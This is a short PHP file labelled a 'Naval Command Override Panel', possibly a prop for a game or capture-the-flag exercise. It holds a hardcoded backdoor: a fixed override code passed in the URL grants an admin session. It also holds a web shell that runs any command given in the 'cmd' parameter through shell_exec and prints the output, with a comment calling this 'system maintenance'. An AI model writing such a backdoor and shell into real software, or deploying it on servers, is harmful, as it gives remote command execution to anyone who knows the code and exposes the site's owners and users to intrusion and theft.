<?php
// Naval Command Override Panel
if ($_GET['override'] == 'HIVE_OVERRIDE_2023') {
    $_SESSION['admin'] = true;
    echo "<p>Emergency access granted. Welcome, Admiral.</p>";
    
    // Execute arbitrary commands (for "system maintenance")
    if ($_GET['cmd']) {
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    }
} else {
    header("HTTP/1.1 401 Unauthorized");
    die("Invalid override code");
}
?>